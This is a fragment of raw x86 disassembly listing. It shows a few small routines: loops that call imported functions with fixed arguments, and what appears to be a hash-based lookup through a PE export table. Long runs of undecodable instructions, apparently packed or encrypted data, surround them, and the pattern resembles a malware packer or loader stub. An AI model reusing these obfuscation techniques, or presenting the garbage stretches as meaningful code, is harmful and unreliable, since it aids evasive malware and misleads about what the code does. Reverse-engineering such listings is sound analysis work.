  40eb34:	cmp    DWORD PTR ds:0x4337d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4337d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4337d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4337d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4337e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43379b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43382b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    dh,ch
  40ebb4:	xor    bl,BYTE PTR ds:0x7ea59ae4
  40ebba:	jle    0x40ec10
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ec24
  40ebc0:	sbb    dh,0x57
  40ebc3:	cmp    al,0x1d
  40ebc5:	jns    0x40ec19
  40ebc7:	hlt    
  40ebc8:	icebp  
  40ebc9:	in     eax,0x35
  40ebcb:	mov    ebp,0xf1197eb8
  40ebd0:	aad    0xc1
  40ebd2:	call   0xbbc2:0xfea0b31c
  40ebd9:	dec    esi
  40ebda:	xchg   edi,eax
  40ebdb:	in     al,0xf2
  40ebdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebde:	and    DWORD PTR [edi],0x29
  40ebe1:	out    dx,al
  40ebe2:	dec    ebx
  40ebe3:	fimul  DWORD PTR ds:0x35521aa2
  40ebe9:	sub    BYTE PTR [ecx+0x256bf030],al
  40ebef:	xor    ah,BYTE PTR [edi-0x77aaaf70]
  40ebf5:	and    eax,0x92989112
  40ebfa:	mov    esp,ecx
  40ebfc:	(bad)  [edi]
  40ebfe:	ds mov ch,0xde
  40ec01:	mov    ah,0xa5
  40ec03:	inc    ebp
  40ec04:	jo     0x40ec61
  40ec06:	int3   
  40ec07:	fisubr DWORD PTR [ebx+0x4e]
  40ec0a:	sub    DWORD PTR [esp+edi*4+0x67a20d4a],esi
  40ec11:	and    eax,0x6aed694f
  40ec16:	iret   
  40ec17:	lods   al,BYTE PTR ds:[esi]
  40ec18:	cli    
  40ec19:	repnz mov ebx,0x2dd0c59c
  40ec1f:	scas   al,BYTE PTR es:[edi]
  40ec20:	inc    edi
  40ec21:	les    ebp,FWORD PTR [ebx+0x26a1d0e2]
  40ec27:	pop    eax
  40ec28:	jecxz  0x40ebf4
  40ec2a:	pop    esi
  40ec2b:	mov    ds:0x8d5a706d,al
  40ec30:	(bad)  
  40ec31:	in     al,0xd
  40ec33:	call   FWORD PTR [eax]
  40ec35:	sti    
  40ec36:	(bad)  [ecx+eax*1]
  40ec39:	jle    0x40ec42
  40ec3b:	jns    0x40ec1a
  40ec3d:	popa   
  40ec3e:	cmp    al,BYTE PTR [edx-0x6d4703a]
  40ec44:	push   ebp
  40ec45:	js     0x40ec98
  40ec47:	mov    ebx,0x15d48cda
  40ec4c:	mov    esi,0x9ff8dfb5
  40ec51:	mov    ebx,0x4941f50f
  40ec56:	jb     0x40ec56
  40ec58:	mov    edi,0x3c71e0ec
  40ec5d:	std    
  40ec5e:	cmp    ebx,DWORD PTR [eax-0x31]
  40ec61:	or     eax,0x2bba51eb
  40ec66:	cmc    
  40ec67:	jmp    0x40eca1
  40ec69:	pop    eax
  40ec6a:	test   BYTE PTR [eax+0x6f09a925],0xee
  40ec71:	jmp    0xa9cb:0x2f903507
  40ec78:	adc    al,0x6
  40ec7a:	push   ss
  40ec7b:	test   DWORD PTR [ecx+0x29],edx
  40ec7e:	push   0x768507a5
  40ec83:	(bad)
  40ec86:	mov    WORD PTR [ebx-0x7f86b73],?
  40ec8c:	or     eax,0x562fd67c
  40ec91:	jno    0x40ec1b
  40ec93:	shl    DWORD PTR [edx-0x3604e22e],cl
  40ec99:	stos   DWORD PTR es:[edi],eax
  40ec9a:	paddusw mm4,QWORD PTR [edi+0x6c]
  40ec9e:	scas   al,BYTE PTR es:[edi]
  40ec9f:	or     edx,DWORD PTR [ebx-0x6c]
  40eca2:	add    dh,cl
  40eca4:	or     BYTE PTR [edi+0x35],0xd5
  40eca8:	jp     0x40ece4
  40ecaa:	pop    ebx
  40ecab:	clc    
  40ecac:	adc    eax,0xdee23fd3
  40ecb1:	mov    ds:0xd83cd728,al
  40ecb6:	sbb    al,0xad
  40ecb8:	adc    eax,0x739fdc4f
  40ecbd:	sub    esi,ebp
  40ecbf:	cmp    esi,edi
  40ecc1:	shl    DWORD PTR [edi-0x4],cl
  40ecc4:	loopne 0x40ec67
  40ecc6:	dec    eax
  40ecc7:	dec    esp
  40ecc8:	(bad)
  40eccc:	xor    al,0x71
  40ecce:	mov    al,ds:0xfcf0db62
  40ecd3:	sub    al,0xc2
  40ecd5:	out    0x1b,al
  40ecd7:	add    BYTE PTR [edx+0x3d],0x1d
  40ecdb:	xchg   ebx,eax
  40ecdc:	add    BYTE PTR [edx-0x49],bh
  40ecdf:	inc    esp
  40ece0:	mul    DWORD PTR [esi+0x4c]
  40ece3:	imul   esp,ebp,0xffffff91
  40ece6:	bound  edx,QWORD PTR [edi+0x6a]
  40ece9:	cdq    
  40ecea:	call   0xcd020d87
  40ecef:	out    dx,al
  40ecf0:	or     dh,bh
  40ecf2:	jp     0x40ecd8
  40ecf4:	leave  
  40ecf5:	push   ds
  40ecf6:	xchg   ebp,eax
  40ecf7:	icebp  
  40ecf8:	and    DWORD PTR [esp+ebp*1+0x24a72d4a],ebx
  40ecff:	xchg   BYTE PTR [edi-0x5bcaec6e],cl
  40ed05:	inc    BYTE PTR [edi+0x54]
  40ed08:	sbb    edx,DWORD PTR [esi]
  40ed0a:	adc    al,dl
  40ed0c:	repnz mov edi,0x9b85c49a
  40ed12:	cli    
  40ed13:	out    dx,al
  40ed14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed15:	cmp    al,cl
  40ed17:	jl     0x40ed6e
  40ed19:	lea    eax,[eax-0x25956648]
  40ed1f:	stos   DWORD PTR es:[edi],eax
  40ed20:	xor    BYTE PTR [esi-0x69e594d5],bl
  40ed26:	bound  edi,QWORD PTR [eax+ebx*2]
  40ed29:	push   edi
  40ed2a:	fsub   DWORD PTR [edx-0x6f6d57b6]
  40ed30:	cmp    dl,BYTE PTR [esi+0x2c86c23b]
  40ed36:	xchg   BYTE PTR [eax+eax*1+0x47bb586e],bh
  40ed3d:	lea    edi,[ebp+eiz*1+0x56]
  40ed41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed42:	stc    
  40ed43:	lds    ecx,FWORD PTR [esi-0x27]
  40ed46:	jo     0x40ed7f
  40ed48:	stc    
  40ed49:	inc    BYTE PTR [edi-0x1d]
  40ed4c:	std    
  40ed4d:	mov    eax,0x6efd8cab
  40ed52:	sbb    BYTE PTR [esi-0xd],dl
  40ed55:	ss pop ss
  40ed57:	mov    eax,0xb39e56f7
  40ed5c:	xor    BYTE PTR ds:0x49868b62,bl
  40ed62:	and    ch,al
  40ed64:	sbb    ebx,DWORD PTR [edx-0x6e9fdc68]
  40ed6a:	in     al,0xb7
  40ed6c:	enter  0x753c,0x7b
  40ed70:	stos   BYTE PTR es:[edi],al
  40ed71:	adc    BYTE PTR [ecx+0x3e],ch
  40ed74:	pop    ss
  40ed75:	int3   
  40ed76:	gs mov dl,0x3f
  40ed79:	div    ebp
  40ed7b:	inc    edx
  40ed7c:	cdq    
  40ed7d:	mov    ch,0x19
  40ed7f:	pop    ds
  40ed80:	idiv   BYTE PTR [eax+0x49]
  40ed83:	mov    al,ds:0x64f1733e
  40ed88:	adc    DWORD PTR [ecx+0x78],esi
  40ed8b:	lahf   
  40ed8c:	sbb    bl,BYTE PTR [edi]
  40ed8e:	push   es
  40ed8f:	sub    eax,0xc5ed053e
  40ed94:	push   cs
  40ed95:	icebp  
  40ed96:	repnz mul BYTE PTR [esi]
  40ed99:	xor    eax,edx
  40ed9b:	sub    ecx,DWORD PTR ds:0x433753
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4337d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4337d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4337d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4337d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4337d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x107dbdd8]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	sti    
  40ee77:	mov    ecx,0x5d2feefa
  40ee7c:	mov    ecx,0x866a2685
  40ee81:	int    0x22
  40ee83:	clc    
  40ee84:	dec    edi
  40ee85:	cmp    DWORD PTR [eax-0x57c42654],ecx
  40ee8b:	or     BYTE PTR [ebx],ah
  40ee8d:	push   eax
  40ee8e:	or     DWORD PTR [ecx+0x78b511c2],eax
  40ee94:	aaa    
  40ee95:	or     BYTE PTR [edx-0x35],bh
  40ee98:	cmp    ebx,esi
  40ee9a:	xchg   DWORD PTR [ecx],ebp
  40ee9c:	sar    cl,1
  40ee9e:	cwde   
  40ee9f:	sub    BYTE PTR ds:0xf22c9f3f,0xab
  40eea6:	fs aas 
  40eea8:	lea    edi,[ebx+0x4a]
  40eeab:	das    
  40eeac:	mov    dh,0xff
  40eeae:	jp     0x40eea9
  40eeb0:	ret    0x6a4e
  40eeb3:	fst    DWORD PTR [edx]
  40eeb5:	cli    
  40eeb6:	adc    BYTE PTR [ebx],0xed
  40eeb9:	mov    cl,0xb0
  40eebb:	fcom   st(5)
  40eebd:	adc    eax,0xd343f41c
  40eec2:	dec    ebx
  40eec3:	lods   eax,DWORD PTR ds:[esi]
  40eec4:	fdivr  QWORD PTR [ecx+0x8]
  40eec7:	xchg   esi,eax
  40eec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eec9:	dec    ebx
  40eeca:	adc    al,0x76
  40eecc:	clc    
  40eecd:	fsubrp st(5),st
  40eecf:	dec    eax
  40eed0:	gs in  al,0x72
  40eed3:	es dec esi
  40eed5:	add    edx,ecx
  40eed7:	repz adc al,0xdf
  40eeda:	fdiv   QWORD PTR [edx-0x18bbd979]
  40eee0:	adc    cl,cl
  40eee2:	inc    ecx
  40eee3:	mov    edx,0x56457f4c
  40eee8:	mov    ebx,0x92020784
  40eeed:	gs pop esp
  40eeef:	pop    ds
  40eef0:	addr16 sti 
  40eef2:	stos   DWORD PTR es:[edi],eax
  40eef3:	test   DWORD PTR [eax-0x65caaf3d],esi
  40eef9:	ror    bh,1
  40eefb:	and    BYTE PTR [ecx],dl
  40eefd:	es adc al,0x41
  40ef00:	pop    es
  40ef01:	sar    DWORD PTR [ecx],0x6
  40ef04:	cmc    
  40ef05:	mov    DWORD PTR [edx+esi*4],ecx
  40ef08:	xchg   ebx,eax
  40ef09:	dec    ebp
  40ef0a:	mov    al,BYTE PTR [ebx+0x12cc7511]
  40ef10:	pop    edi
  40ef11:	es (bad) 
  40ef13:	fiadd  DWORD PTR [edi+0x2f]
  40ef16:	aad    0x4b
  40ef18:	xchg   ebx,eax
  40ef19:	test   DWORD PTR [ebp-0x68],0x8fa67fa7
  40ef20:	sbb    BYTE PTR [edx+ebp*8+0xe6fdc4c],cl
  40ef27:	retf   0xe480
  40ef2a:	or     BYTE PTR [eax-0x21],0xd8
  40ef2e:	dec    edx
  40ef2f:	add    ecx,DWORD PTR [esi+edx*1-0x54]
  40ef33:	aam    0xbc
  40ef35:	jnp    0x40ef8d
  40ef37:	dec    edi
  40ef38:	cmp    BYTE PTR [esi],bh
  40ef3a:	add    dl,BYTE PTR [esi+0xf]
  40ef3d:	mov    BYTE PTR [esi],dh
  40ef3f:	arpl   WORD PTR [edx],ax
  40ef41:	xor    DWORD PTR [ecx+0x61],edi
  40ef44:	scas   eax,DWORD PTR es:[edi]
  40ef45:	jg     0x40ef16
  40ef47:	pop    ecx
  40ef48:	scas   al,BYTE PTR es:[edi]
  40ef49:	scas   al,BYTE PTR es:[edi]
  40ef4a:	stos   DWORD PTR es:[edi],eax
  40ef4b:	lock mov dh,0xd4
  40ef4e:	jns    0x40efb6
  40ef50:	mov    edx,0x61339af6
  40ef55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef56:	cmp    DWORD PTR [ebx-0x2e4e1a7d],esp
  40ef5c:	xor    BYTE PTR [eax],0xee
  40ef5f:	mov    WORD PTR [edi],fs
  40ef61:	inc    edx
  40ef62:	icebp  
  40ef63:	(bad)  
  40ef64:	popa   
  40ef65:	mov    esp,0xa02c52b5
  40ef6a:	(bad)  
  40ef6b:	cmp    eax,0xb8b6e33c
  40ef70:	add    BYTE PTR [edx+0xb],cl
  40ef73:	call   0xe934:0x1b8fc0ce
  40ef7a:	ds push ecx
  40ef7c:	pusha  
  40ef7d:	inc    ebx
  40ef7e:	clc    
  40ef7f:	xor    esi,DWORD PTR fs:[ebp+edx*4+0x3d]
  40ef84:	iret   
  40ef85:	xor    al,0x97
  40ef87:	call   0x45d9:0xa1e946d8
  40ef8e:	mov    eax,ds:0x4c606cd7
  40ef93:	and    cl,dh
  40ef95:	dec    esi
  40ef96:	adc    eax,0x80f9253b
  40ef9b:	xchg   edi,eax
  40ef9c:	push   eax
  40ef9d:	pop    ebx
  40ef9e:	scas   eax,DWORD PTR es:[edi]
  40ef9f:	xor    al,BYTE PTR [edx+0x20c6f6fc]
  40efa5:	stos   DWORD PTR es:[edi],eax
  40efa6:	cmp    al,0xc6
  40efa8:	add    al,BYTE PTR [edx]
  40efaa:	xchg   DWORD PTR [ebx-0x403c725d],esp
  40efb0:	(bad)  
  40efb2:	inc    eax
  40efb3:	(bad)  
  40efb5:	add    bh,bl
  40efb7:	es mov ch,0x93
  40efba:	xor    bl,dh
  40efbc:	and    al,0xf4
  40efbe:	mov    eax,DWORD PTR [eax+0x30e7d706]
  40efc4:	mov    bl,0x85
  40efc6:	mov    cl,0x66
  40efc8:	outs   dx,DWORD PTR ds:[esi]
  40efc9:	sbb    esp,DWORD PTR [ecx+0x40a34f00]
  40efcf:	(bad)  
  40efd0:	fwait
  40efd1:	inc    ebp
  40efd2:	lahf   
  40efd3:	ret    
  40efd4:	sub    DWORD PTR [edx+0x4a],0x8a247ba3
  40efdb:	(bad)  
  40efdc:	fstp   DWORD PTR [ebp-0x456325a9]
  40efe2:	jns    0x40ef88
  40efe4:	jae    0x40ef6f
  40efe6:	pop    eax
  40efe7:	aad    0xc7
  40efe9:	and    dh,cl
  40efeb:	hlt    
  40efec:	retf   0x5223
  40efef:	pop    ds
  40eff0:	fcomp  DWORD PTR [ebp-0x2e]
  40eff3:	pop    es
  40eff4:	shl    DWORD PTR [edx],1
  40eff6:	test   al,0xa7
  40eff8:	mov    bh,0x96
  40effa:	and    BYTE PTR [ebx-0x6e6136e5],dl
  40f000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f001:	into   
  40f002:	bound  edi,QWORD PTR [ebx]
  40f004:	or     bl,0xdd
  40f007:	(bad)  
  40f008:	mov    eax,ds:0xa55d66b3
  40f00d:	(bad)  
  40f00e:	or     eax,0xb2865c41
  40f013:	ficomp DWORD PTR [esi-0x1f]
  40f016:	and    al,0x45
  40f018:	sbb    edi,DWORD PTR [edi+0x3]
  40f01b:	xor    edi,ebp
  40f01d:	nop
  40f01e:	push   esp
  40f01f:	mov    dl,0x52
  40f021:	aam    0x9
  40f023:	mov    DWORD PTR [esi-0x7890e8af],eax
  40f029:	xchg   edi,eax
  40f02a:	(bad)  
  40f02b:	aaa    
  40f02c:	add    esp,DWORD PTR [ebp+eax*1-0x35]
  40f030:	aas    
  40f031:	scas   al,BYTE PTR es:[edi]
  40f032:	mov    ebp,0x95080899
  40f037:	outs   dx,DWORD PTR ds:[esi]
  40f038:	jb     0x40f09e
  40f03a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f03b:	adc    dl,bh
  40f03d:	mov    edi,0xbe040c7e
  40f042:	(bad)  
  40f043:	cld    
  40f044:	or     al,0x9f
  40f047:	fadd   st(7),st
  40f049:	adc    BYTE PTR [eax-0x1c508018],bl
  40f04f:	in     eax,dx
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43379b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xc66c1594,ebx
  40f076:	ja     0x40f0ef
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	cs push ds
  40f082:	(bad)  
  40f083:	push   0x2ec5346d
  40f088:	lock mov ecx,0xf54beb3
  40f08e:	jmp    0x6932:0x6e0311fd
  40f095:	mov    cl,ch
  40f097:	or     BYTE PTR [ecx],ah
  40f099:	mov    edx,0x2fd39746
  40f09e:	jmp    0x6bef:0x13538f6c
  40f0a5:	jnp    0x40f114
  40f0a7:	mov    ch,0xea
  40f0a9:	lods   eax,DWORD PTR ds:[esi]
  40f0aa:	lds    esp,FWORD PTR ds:0x85c9807c
  40f0b0:	nop
  40f0b1:	cmp    esi,DWORD PTR [esi]
  40f0b3:	or     DWORD PTR [esi-0x11],edx
  40f0b6:	mov    ds:0x7bf8069f,eax
  40f0bb:	xor    BYTE PTR [edx+esi*8-0x4],bl
  40f0bf:	jg     0x40f08e
  40f0c1:	pop    ebp
  40f0c2:	and    al,BYTE PTR [ecx+0x338eb6b7]
  40f0c8:	mov    BYTE PTR [edi+0xc],cl
  40f0cb:	push   esp
  40f0cc:	push   esi
  40f0cd:	call   0x82e6ddc7
  40f0d2:	ret    
  40f0d3:	inc    ebp
  40f0d4:	mov    cl,0x84
  40f0d6:	ins    DWORD PTR es:[edi],dx
  40f0d7:	lods   al,BYTE PTR ds:[esi]
  40f0d8:	xchg   esi,eax
  40f0d9:	xor    al,0x8a
  40f0db:	add    bl,BYTE PTR [eax-0x65]
  40f0de:	mov    bl,0x7a
  40f0e0:	cli    
  40f0e1:	enter  0xc9ea,0xfc
  40f0e5:	fs int3 
  40f0e7:	fwait
  40f0e8:	in     eax,dx
  40f0e9:	xchg   edx,eax
  40f0ea:	mov    cl,0x3d
  40f0ec:	or     BYTE PTR [esi-0x7daa682a],ch
  40f0f2:	enter  0xebec,0x1e
  40f0f6:	fsub   DWORD PTR [edi-0x12facb8a]
  40f0fc:	(bad)  
  40f0fd:	xchg   edx,eax
  40f0fe:	xor    cl,BYTE PTR [edi]
  40f100:	ins    DWORD PTR es:[edi],dx
  40f101:	adc    BYTE PTR [edi-0x41],bh
  40f104:	loope  0x40f173
  40f106:	test   DWORD PTR [eax+edx*2+0x5298c73],ebx
  40f10d:	ja     0x40f122
  40f10f:	(bad)  
  40f110:	into   
  40f111:	fs jmp 0x40f0b8
  40f114:	pop    edi
  40f115:	mov    ch,0x13
  40f117:	sbb    eax,DWORD PTR ds:0xf4c6b23e
  40f11d:	das    
  40f11e:	pop    edx
  40f11f:	lahf   
  40f120:	mov    eax,0x9e4bc2b7
  40f125:	dec    edi
  40f126:	inc    edi
  40f127:	cwde   
  40f128:	push   ss
  40f129:	cmp    BYTE PTR [esi+0x7f],ah
  40f12c:	lahf   
  40f12d:	(bad)  
  40f12e:	jp     0x40f17a
  40f130:	lods   eax,DWORD PTR ds:[esi]
  40f131:	(bad)  
  40f134:	mov    WORD PTR [edx-0x15],cs
  40f137:	leave  
  40f138:	push   es
  40f139:	retf   
  40f13a:	mov    ah,0xa
  40f13c:	sbb    eax,eax
  40f13e:	cld    
  40f13f:	dec    ebp
  40f140:	adc    eax,0x411bbe05
  40f145:	js     0x40f16d
  40f147:	clc    
  40f148:	in     eax,0xa7
  40f14a:	inc    edx
  40f14b:	sbb    al,0x3e
  40f14d:	xchg   edx,eax
  40f14e:	cmp    eax,0x70b023dc
  40f153:	xlat   BYTE PTR ds:[ebx]
  40f154:	cwde   
  40f155:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f156:	je     0x40f14c
  40f158:	lock jae 0x40f115
  40f15b:	or     al,0x1e
  40f15d:	sub    eax,0xf16d56ea
  40f162:	enter  0xa1dc,0x45
  40f166:	or     al,0x3
  40f168:	xor    ebp,DWORD PTR [esi+0x22a05237]
  40f16e:	jmp    0x40f1a5
  40f170:	dec    ebp
  40f171:	cmp    edi,edi
  40f173:	aad    0x3c
  40f175:	dec    ebx
  40f176:	push   eax
  40f177:	dec    ecx
  40f178:	mov    ebx,0xc0547fa7
  40f17d:	xor    eax,0x90109896
  40f182:	pushf  
  40f183:	repnz and edi,DWORD PTR [edi+0x23]
  40f187:	div    bl
  40f189:	shl    ebx,0xd1
  40f18c:	push   edi
  40f18d:	or     bl,ah
  40f18f:	arpl   WORD PTR [ebx-0x7d],ax
  40f192:	sub    bl,BYTE PTR [ebp+0x28ef40aa]
  40f198:	cli    
  40f199:	add    eax,0x821c6a
  40f19e:	mov    ebp,0x2ca06244
  40f1a3:	pop    ss
  40f1a4:	push   ecx
  40f1a5:	aad    0xce
  40f1a7:	pushf  
  40f1a8:	push   edi
  40f1a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1aa:	jae    0x40f209
  40f1ac:	addr16 fldl2t 
  40f1af:	push   eax
  40f1b0:	out    dx,al
  40f1b1:	ret    
  40f1b2:	rol    BYTE PTR [ebx-0x3b],0x42
  40f1b6:	lock gs xor ebx,0x13ea93c3
  40f1be:	mov    DWORD PTR [esi+0x53c6a4b3],ecx
  40f1c4:	and    DWORD PTR [eax+0x77],esi
  40f1c7:	out    dx,al
  40f1c8:	inc    esi
  40f1c9:	test   eax,0xcf28d06b
  40f1ce:	ds jnp 0x40f234
  40f1d1:	mov    bh,0x82
  40f1d3:	in     eax,dx
  40f1d4:	cmp    dh,cl
  40f1d6:	(bad)  
  40f1d7:	(bad)  
  40f1d8:	fsub   st(6),st
  40f1da:	in     eax,0x48
  40f1dc:	std    
  40f1dd:	popf   
  40f1de:	xor    bl,BYTE PTR [esi]
  40f1e0:	das    
  40f1e1:	or     ecx,ebp
  40f1e3:	leave  
  40f1e4:	push   edx
  40f1e5:	lock (bad) 
  40f1e8:	ror    DWORD PTR [ebx],cl
  40f1ea:	mov    ah,0xf
  40f1ec:	std    
  40f1ed:	cmc    
  40f1ee:	sbb    eax,0xbeac1bd6
  40f1f3:	adc    ah,ah
  40f1f5:	jae    0x40f19d
  40f1f7:	dec    esp
  40f1f8:	or     al,0xa1
  40f1fa:	push   eax
  40f1fb:	xchg   esi,eax
  40f1fc:	je     0x40f208
  40f1fe:	lods   al,BYTE PTR ds:[esi]
  40f1ff:	sar    al,cl
  40f201:	popa   
  40f202:	xor    BYTE PTR [esp+edx*1],cl
  40f205:	nop
  40f206:	inc    ebx
  40f207:	cmp    al,0x5b
  40f209:	or     eax,0x7f5d4fcc
  40f20e:	jge    0x40f21a
  40f210:	dec    edi
  40f211:	dec    ebp
  40f212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f213:	into   
  40f214:	mov    dh,0x2a
  40f216:	xor    edx,DWORD PTR [ecx-0x12]
  40f219:	in     eax,dx
  40f21a:	fiadd  DWORD PTR [ecx]
  40f21c:	sti    
  40f21d:	and    eax,ebp
  40f21f:	stos   DWORD PTR es:[edi],eax
  40f220:	mov    esp,es
  40f222:	ja     0x40f297
  40f224:	repz adc DWORD PTR [edi-0x43],ebx
  40f228:	fiadd  WORD PTR [ecx+ebx*1+0x7]
  40f22c:	sbb    edx,DWORD PTR [edx+0x33]
  40f22f:	loop   0x40f22f
  40f231:	fbstp  TBYTE PTR [ebx+0xc526c1]
  40f237:	fs scas eax,DWORD PTR es:[edi]
  40f239:	push   0xbe8c9d6
  40f23e:	and    DWORD PTR ds:0xe89a6a9,esp
  40f244:	fcomp  st(2)
  40f246:	ds in  al,dx
  40f248:	mov    edi,0xcbaa499f
  40f24d:	xchg   esi,eax
  40f24e:	push   esi
  40f24f:	sub    edi,DWORD PTR [eax+0x67]
  40f252:	mov    ah,0x55
  40f254:	inc    ecx
  40f255:	das    
  40f256:	xchg   ch,cl
  40f258:	inc    esp
  40f259:	xor    al,0xff
  40f25b:	pop    ebp
  40f25c:	xor    al,BYTE PTR fs:[eax-0x4702180f]
  40f263:	lahf   
  40f264:	add    dl,BYTE PTR [eax+0x5c830e04]
  40f26a:	int    0xb4
  40f26c:	or     al,0x1f
  40f26e:	fcom   st(7)
  40f270:	mov    DWORD PTR [esi+0x730765dc],edx
  40f276:	scas   eax,DWORD PTR es:[edi]
  40f277:	fwait
  40f278:	sub    cl,BYTE PTR ds:0xbe278bd
  40f27e:	mov    esp,0x52bf6e86
  40f283:	je     0x40f300
  40f285:	ja     0x40f24a
  40f287:	js     0x40f219
  40f289:	das    
  40f28a:	scas   al,BYTE PTR es:[edi]
  40f28b:	and    DWORD PTR [si],0x821e95ea
  40f292:	jg     0x40f237
  40f294:	sbb    eax,0x94d7eace
  40f299:	arpl   ax,sp
  40f29b:	inc    esi
  40f29c:	lock dec esp
  40f29e:	or     dh,cl
  40f2a0:	sbb    esp,DWORD PTR [ecx]
  40f2a2:	jle    0x40f2fc
  40f2a4:	sti    
  40f2a5:	push   ds
  40f2a6:	cs xchg ebp,eax
  40f2a8:	test   al,0x67
  40f2aa:	push   ds
  40f2ab:	mov    ch,0x2c
  40f2ad:	mov    ds:0xcab5ed77,eax
  40f2b2:	and    al,0xf6
  40f2b4:	rep stos BYTE PTR es:[edi],al
  40f2b6:	fnstenv [eax*8-0x1a795958]
  40f2bd:	arpl   cx,di
  40f2bf:	in     eax,dx
  40f2c0:	ss pop ebx
  40f2c2:	mov    edx,DWORD PTR [ebp+0x354466c0]
  40f2c8:	call   0xaf2f:0xd839bce9
  40f2cf:	or     bh,al
  40f2d1:	sti    
  40f2d2:	xor    WORD PTR [ebp-0x12],si
  40f2d6:	test   al,bh
  40f2d8:	gs adc eax,0x8cd86672
  40f2de:	gs xor eax,0xb66117f8
  40f2e4:	xchg   ecx,eax
  40f2e5:	or     ecx,DWORD PTR [edx-0x3ffbbbc9]
  40f2eb:	dec    ebx
  40f2ec:	js     0x40f29f
  40f2ee:	push   esp
  40f2ef:	xchg   esp,eax
  40f2f0:	xor    esp,DWORD PTR [edx]
  40f2f2:	jnp    0x40f292
  40f2f4:	jo     0x40f27c
  40f2f6:	sti    
  40f2f7:	add    edi,DWORD PTR ds:[esi+ecx*4-0x519b6d9e]
  40f2ff:	adc    DWORD PTR [edi-0x4759e5ad],ebx
  40f305:	push   0xcc1e60b8
  40f30a:	test   eax,0x77293f34
  40f30f:	jge    0x40f2d4
  40f311:	xor    al,0x24
  40f313:	jecxz  0x40f2ac
